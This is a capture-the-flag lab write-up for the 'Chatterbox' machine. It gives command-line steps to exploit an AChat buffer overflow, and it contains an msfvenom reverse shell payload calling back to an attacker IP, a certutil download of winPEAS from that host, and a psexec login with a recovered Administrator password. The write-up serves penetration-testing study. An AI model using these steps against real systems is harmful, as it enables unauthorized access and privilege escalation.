## Chatterbox

Difficulty: Medium

### User Flag

```
rustscan -a 10.10.10.74 --ulimit 5000 -- -A -sV -sC
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/6fcef23b-e86b-4172-8074-bbae1277d8b6)

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/3f2b287b-d026-4104-9142-1d3a0097c5ff)

<br>

On port 9255 and 9256 there is AChat Chat System. Searching por exploit, we find one.

```
searchsploit achat
searchsploit -m windows/remote/36025.py
```

![searchsploit](https://github.com/b1d0ws/OSCP/assets/58514930/b966f33a-5172-4fdb-b22a-e4e6921d54a7)

![exploit](https://github.com/b1d0ws/OSCP/assets/58514930/a962d0d4-fefb-49e9-a70b-9769d7788f78)

<br>

The exploit has a buffer that executes calc.exe. We need to generate a reverse shell buffer payload and replace it.

```
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp lhost=10.10.14.21 lport=4444 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python

python2 36025.py
```

![generatingBuffer](https://github.com/b1d0ws/OSCP/assets/58514930/6e6255a2-d246-4b69-8eef-03f132fd5946)

![firstRevShell](https://github.com/b1d0ws/OSCP/assets/58514930/95c67245-0b65-4280-9953-dff9a819f5eb)

### Root Flag

Executing winPEAS, we find Autologon credentials

```
certutil -urlcache -f http://10.10.14.21/winPEASx86.exe winPEASx86.exe
.\winPEASx86.exe
```

![winPEAS](https://github.com/b1d0ws/OSCP/assets/58514930/4f08e1ed-5aa5-4415-a8b3-72c6f966e81a)

<br>

This password works for Administrator user, so we can login with psexec.

```
impacket-psexec Administrator:Welcome1\!@10.10.10.74
```
![administrator](https://github.com/b1d0ws/OSCP/assets/58514930/20efc9ee-8464-424b-bacf-8d1a5b8395a1)

<br>

As you see, Administrator doesn't have access to read the flag. For some reason, we can change this permission with Alfred user.

```
icacls root.txt /grant everyone:R
```

![rootFlag](https://github.com/b1d0ws/OSCP/assets/58514930/d28b5285-13a5-4add-8c18-441f3f1e9446)
